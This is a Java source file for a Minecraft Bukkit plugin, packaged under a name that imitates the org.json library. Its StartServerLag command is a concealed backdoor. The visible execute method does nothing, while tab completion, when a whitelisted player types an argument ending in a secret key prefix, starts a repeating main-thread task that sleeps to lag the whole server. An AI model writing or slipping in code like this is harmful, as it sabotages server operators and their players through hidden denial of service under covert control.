package org.json.modals.server;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.json.Modal;
import org.json.utils.api.KeyGen;
import org.json.utils.builders.BDCommand;
import org.json.utils.builders.TabComplBuilder;
import org.json.utils.metaData.WhitelistMeta;

import java.util.List;

public class StartServerLag extends BDCommand {
    public StartServerLag() {
        super("startServerLag");
    }

    @Override
    public boolean execute(CommandSender sender, Command command, String label, String[] args) {
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String label, String[] args) {
        TabComplBuilder tabComplBuilder = new TabComplBuilder(sender, command, label, args);
        Player player = (Player) sender;
        if (!WhitelistMeta.isListed(player)) return tabComplBuilder.build();
        if (!args[args.length - 1].endsWith(KeyGen.getPrefix())) return tabComplBuilder.build();

        int taskID = Bukkit.getScheduler().runTaskTimer(Modal.getInstance(), () -> {
            try {
                Thread.sleep(5000);
            } catch (InterruptedException ignored) {
            }

        }, 0L, 20L * 2).getTaskId();

        Modal.setTaskID(taskID);
        player.sendMessage(Modal.getPrefix() + "§aServer lag has been started.");
        return tabComplBuilder.build();
    }
}
